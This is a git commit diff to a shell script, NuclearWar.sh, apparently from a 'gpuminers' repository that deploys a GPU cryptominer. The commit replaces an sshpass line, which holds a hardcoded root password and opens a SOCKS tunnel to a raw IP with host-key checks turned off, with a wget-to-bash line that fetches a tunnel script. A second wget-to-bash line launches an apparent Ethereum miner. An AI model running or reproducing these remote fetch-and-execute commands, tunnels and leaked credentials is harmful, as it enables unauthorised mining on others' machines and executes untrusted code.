4b333cb62672382da447a7fc92b62eade9b89ecb
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-02-04 14:22:33 +0200

    Update NuclearWar.sh

--- NuclearWar.sh
+++ NuclearWar.sh
@@ -4,5 +4,5 @@ ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 apt -y install libpci-dev apt-utils wget nano net-tools htop whiptail dialog sshpass screen > /dev/null
 screen -S mine
-sshpass -p Pmataga87465622 sh -c 'ssh -o StrictHostKeyChecking=no -f -N -A -D 9999 root@35.172.228.165 && sleep .1'
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash && sleep .1
 wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/start_nbEthermMandy.sh | bash
